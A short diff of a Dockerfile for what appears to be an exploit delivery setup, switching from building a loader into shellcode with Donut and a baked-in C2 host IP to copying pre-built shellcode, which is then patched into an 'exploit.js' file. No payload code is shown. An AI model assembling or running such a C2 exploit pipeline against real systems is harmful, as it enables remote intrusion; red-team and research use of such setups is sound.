@@ -22,9 +22,9 @@ COPY exfil-server/exploit-contents/ ./
 WORKDIR /opt/shellcode-gen
 COPY exfil-server/shellcode-generation/ ./
 
-# Build loader.exe and convert to shellcode via Donut, with host IP baked in
-RUN make -C /opt/shellcode-gen HOST_IP=${C2_HOST_IP} && \
-    cp /opt/shellcode-gen/loader.bin /tmp/shellcode.bin
+# Use pre-built shellcode — run `make HOST_IP=<ip>` in shellcode-generation/ on the host
+# before docker compose up --build to regenerate with a new IP.
+RUN cp /opt/shellcode-gen/bin/final_shellcode.bin /tmp/shellcode.bin
 
 # Patch generated shellcode into exploit.js
 RUN printf '%s\n' \
